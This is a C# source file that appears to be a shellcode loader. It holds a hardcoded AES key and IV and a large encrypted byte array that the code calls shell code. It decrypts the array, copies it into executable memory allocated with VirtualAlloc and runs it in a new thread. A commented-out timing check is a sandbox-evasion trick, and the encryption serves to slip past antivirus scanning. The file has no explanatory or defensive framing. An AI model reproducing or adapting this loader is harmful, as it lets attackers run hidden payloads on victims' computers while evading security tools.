using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
/// <summary>
/// Programmer : Diljith Suresh
/// </summary>
namespace Decrypt
{
    class ProgramT
    {
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
        [DllImport("kernel32.dll")]
        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
        [DllImport("kernel32.dll")]
        static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

        static void MainT(string[] args)
        {
            /* DateTime dtCurrentTime = DateTime.Now;
             Thread.Sleep(2000);
             double dbTotalTime = DateTime.Now.Subtract(dtCurrentTime).TotalSeconds;
             if (dbTotalTime < 1.5)
             {
                 return;
             }*/

            byte[] Key = Convert.FromBase64String("fRZstgVonk1WpSLeb9ZKcoDkGPzHWDqSAMyTxoopGc8=");
            byte[] IV = Convert.FromBase64String("pyve1rU+58PN/2MWEftieA==");

            //byte[] Key = ASCIIEncoding.ASCII.GetBytes("thisisa32bytekey0123456789!@#$%^");
            // byte[] IV = ASCIIEncoding.ASCII.GetBytes("thisis16bytes456");
            byte[] baCipher = new byte[] { 0x57, 0x9c, 0xfd, 0x51, 0x09, 0x98, 0x15, 0x2b, 0x02, 0xb9, 0x6c, 0xd3, 0x47, 0x09, 0x7d, 0x55, 0xaf, 0xfa, 0x26, 0xe0, 0x84, 0x88, 0x5e, 0xf9, 0xef, 0x1b, 0xaa, 0xb6, 0xcd, 0xfc, 0xe4, 0xdb, 0x85, 0x7f, 0x80, 0xc2, 0x02, 0x84, 0x2a, 0x05, 0xf3, 0x0b, 0x24, 0xcf, 0x40, 0xff, 0x1a, 0xce, 0xf0, 0xdb, 0x3a, 0x59, 0x99, 0x19, 0x3c, 0x4e, 0xba, 0x6f, 0xf7, 0xf6, 0x7f, 0x57, 0x0d, 0xde, 0x51, 0x3e, 0xfc, 0xf7, 0xfb, 0x2f, 0x53, 0x0f, 0xcd, 0x1b, 0x65, 0x6f, 0x85, 0x3e, 0x29, 0x5d, 0x64, 0x81, 0xd3, 0x61, 0x97, 0x1d, 0x22, 0x49, 0x92, 0xa7, 0xce, 0x06, 0x70, 0x8d, 0xee, 0x55, 0x58, 0x91, 0xd2, 0x90, 0x11, 0x5c, 0x29, 0x80, 0xda, 0xbf, 0xe1, 0xae, 0x5f, 0xeb, 0xc2, 0x78, 0xfd, 0xf7, 0x0a, 0x3c, 0x59, 0xe1, 0xff, 0xd5, 0x0b, 0x5f, 0x71, 0x18, 0x34, 0x6a, 0x5d, 0xd4, 0x7c, 0x84, 0x9d, 0xfa, 0x62, 0xbe, 0xd6, 0x4e, 0xba, 0xbb, 0xe0, 0x55, 0xce, 0x3e, 0xf7, 0x4c, 0xe2, 0x1f, 0x02, 0x91, 0xe5, 0x23, 0xa1, 0x71, 0xef, 0x26, 0x9a, 0xb6, 0x4a, 0x27, 0xe2, 0xb6, 0x24, 0xb3, 0x7e, 0x77, 0xbb, 0xab, 0x40, 0x0e, 0x66, 0x58, 0xe7, 0xbb, 0x08, 0x5c, 0x82, 0xd8, 0xeb, 0xa4, 0x56, 0x69, 0xc4, 0x3c, 0x25, 0x04, 0x27, 0x4a, 0x60, 0x74, 0x65, 0x25, 0x49, 0x3d, 0x9b, 0x8a, 0x8c, 0xf2, 0x62, 0x69, 0x08, 0xbe, 0x23, 0x90, 0xa1, 0x4d, 0x48, 0x4b, 0xf1, 0x8b, 0x92, 0x34, 0x3e, 0x21, 0x65, 0x4d, 0x8b, 0xb2, 0xca, 0x97, 0x41, 0x15, 0xe8, 0x0b, 0x34, 0x78, 0x2a, 0x34, 0x11, 0xf1, 0x17, 0x0f, 0x56, 0x1a, 0x18, 0x84, 0x4a, 0x1f, 0x6e, 0xb1, 0xf2, 0x90, 0x07, 0x68, 0xd6, 0x7c, 0x0d, 0xaa, 0xd5, 0xad, 0xb4, 0xa0, 0x2c, 0x0c, 0x93, 0x85, 0x28, 0x53, 0x1a, 0x51, 0xde, 0xdf, 0x19, 0xd0, 0x90, 0xad, 0x5c, 0x8b, 0x64, 0x17, 0xf1, 0x46, 0xce, 0x7b, 0x44, 0x85, 0xa4, 0x2a, 0x54, 0x69, 0x8f, 0x2f, 0xcd, 0x4c, 0xe1, 0x16, 0x90, 0x54, 0x30, 0x64, 0x75, 0xba, 0x29, 0x18, 0x47, 0x48, 0x97, 0x8d, 0xf0, 0x17, 0xa1, 0xc2, 0x78, 0xa9, 0x85, 0x26, 0x01, 0x9f, 0x8d, 0x32, 0x64, 0xe6, 0x08, 0xd8, 0xb2, 0x25, 0xa1, 0x55, 0x51, 0x97, 0xd9, 0xb6, 0x2e, 0x3c, 0x6f, 0x7e, 0x02, 0x2d, 0x49, 0xa3, 0xce, 0x99, 0xdc, 0x6a, 0x8b, 0x42, 0x3c, 0x64, 0x15, 0xff, 0x77, 0xd2, 0xf2, 0x7e, 0x0e, 0xb2, 0xe6, 0x2e, 0x75, 0xbb, 0x77, 0x3f, 0x45, 0x98, 0x59, 0x01, 0x14, 0x4e, 0x69, 0x60, 0xf6, 0x68, 0x75, 0x4b, 0x6b, 0x16, 0xe2, 0x65, 0x7e, 0x2e, 0x02, 0x94, 0x9c, 0xb9, 0x14, 0xe4, 0xb7, 0xe8, 0xcb, 0xc2, 0x70, 0x18, 0x2d, 0x0e, 0xae, 0x37, 0x45, 0xbd, 0xbf, 0x52, 0xef, 0xe1, 0x57, 0x5f, 0x88, 0x52, 0x08, 0xdc, 0x1c, 0x88, 0x56, 0x8d, 0xe4, 0x99, 0x75, 0xfa, 0x53, 0x7e, 0xb7, 0x33, 0xf5, 0x83, 0x83, 0x8e, 0x3f, 0x54, 0x1d, 0x7d, 0x29, 0x20, 0x33, 0xbb, 0x69, 0xe2, 0x38, 0xf6, 0x92, 0x09, 0x46, 0x8a, 0xe9, 0xac, 0xe3, 0x85, 0x4c, 0x6e, 0x97, 0xbb, 0xc3, 0x00, 0xd9, 0x2c, 0x8d, 0x0b, 0x1b, 0x5d, 0xe9, 0x3f, 0xa1, 0x72, 0x81, 0xc2, 0x96, 0x9e, 0x4b, 0x5c, 0x8d, 0x47, 0x71, 0x91, 0x85, 0x08, 0x03, 0x65, 0x3c, 0x04, 0x61, 0x0f, 0x2e, 0xa4, 0x40, 0xdb, 0xc2, 0x73, 0x5b, 0x2f, 0x62, 0xaa, 0xc2, 0x48, 0x3f, 0xad, 0xa7, 0x2f, 0xc6, 0xe3, 0x7f, 0x93, 0x44, 0xf4, 0xc5, 0xc2, 0x85, 0x3b, 0xc4, 0xa5, 0xfe, 0xd9, 0xb3, 0x8c, 0x68, 0xd1, 0x18, 0xb5, 0x5b, 0x31, 0x77, 0x23, 0xa8, 0x91, 0x9d, 0xba, 0x9b, 0x83, 0xc5, 0x78, 0x3f, 0x0d, 0x3e, 0xf1, 0xa9, 0xaf, 0x61, 0xf6, 0xf4, 0x7b, 0xd5, 0x5f, 0x5d, 0x16, 0x0a, 0xb5, 0x29, 0x05, 0x0a, 0x74, 0xdf, 0x1e, 0xfe, 0x86, 0xe1, 0x3c, 0xb5, 0xc2, 0x11, 0x5f, 0x6f, 0x32, 0x4c, 0x7c, 0x1a, 0x80, 0x98, 0xd1, 0xe9, 0x23, 0x65, 0x00, 0xbb, 0x6b, 0x41, 0x5f, 0x8d, 0xb5, 0xfe, 0x6a, 0x5d, 0x1c, 0x41, 0x72, 0x2e, 0x47, 0x87, 0x98, 0xe3, 0x36, 0xd4, 0x10, 0x7b, 0xde, 0x76, 0x55, 0x9a, 0x9b, 0x7f, 0x7b, 0x6a, 0x06, 0x2a, 0xa6, 0x9a, 0xad, 0x9a, 0x1b, 0xaa, 0x78, 0x14, 0xd1, 0x6d, 0xf7, 0x40, 0x71, 0xcf, 0xc9, 0x8e, 0x31, 0xee, 0xd8, 0xb8, 0x3a, 0xd3, 0xc7, 0x6e, 0x00, 0x43, 0xb8, 0xa2, 0xfe, 0xce, 0xbc, 0x1a, 0x86, 0x0e, 0x57, 0xd0, 0xc5, 0x49, 0x6f, 0xbf, 0xcc, 0x90, 0x39, 0xab, 0xb1, 0xb6, 0x05, 0x68, 0x02, 0x0a, 0xce, 0xe1, 0x4b, 0x60, 0x92, 0x93, 0x37, 0xac, 0x36, 0x7f, 0xe0, 0x0d, 0x6d, 0x7b, 0x43, 0xa7, 0x26, 0x2b, 0xc2, 0xd5, 0xc7, 0x1b, 0x69, 0xc2, 0x60, 0xcb, 0xb4, 0x42, 0xc9, 0x67, 0xa0, 0xf1, 0xb5, 0x3d, 0xf4, 0x9b, 0x83, 0x6f, 0x33, 0x3c, 0x0f, 0xc9, 0x3d, 0xef, 0x7d, 0x7d, 0x84, 0x74, 0x77, 0x4d, 0x67, 0x15, 0x04, 0xb5, 0xf5, 0xef, 0xe8, 0xeb, 0x42, 0x88, 0x49, 0x48, 0x4b, 0xb1, 0x5a, 0x89, 0xe4 };
            byte[] decShell = AESDecryptor(baCipher, Key, IV);
            StringBuilder hexCodes = new StringBuilder(decShell.Length * 2);
            foreach (byte b in decShell)
            {
                hexCodes.AppendFormat("0x{0:x2},", b);
            }
            Console.WriteLine(hexCodes.ToString().Substring(0, hexCodes.ToString().Length - 1));
            int bufsize = decShell.Length;
            IntPtr addr = VirtualAlloc(IntPtr.Zero, (uint)bufsize, 0x3000, 0x40);
            Marshal.Copy(decShell, 0, addr, bufsize);
            IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
            WaitForSingleObject(hThread, 0xFFFFFFFF);
        }


        private static byte[] AESDecryptor(byte[] baEncryptedShellCode, byte[] key, byte[] iv)
        {
            using (var aes = Aes.Create())
            {
                aes.KeySize = 256;
                aes.BlockSize = 128;
                aes.Padding = PaddingMode.PKCS7;
                aes.Mode = CipherMode.CBC;
                aes.Key = key;
                aes.IV = iv;

                using (var decryptor = aes.CreateDecryptor(aes.Key, aes.IV))
                {
                    return GetDecryptedStream(baEncryptedShellCode, decryptor);
                }
            }
        }
        private static byte[] GetDecryptedStream(byte[] data, ICryptoTransform cryptoTransform)
        {
            using (var ms = new MemoryStream())
            using (var cryptoStream = new CryptoStream(ms, cryptoTransform, CryptoStreamMode.Write))
            {
                cryptoStream.Write(data, 0, data.Length);
                cryptoStream.FlushFinalBlock();

                return ms.ToArray();
            }
        }
    }
}
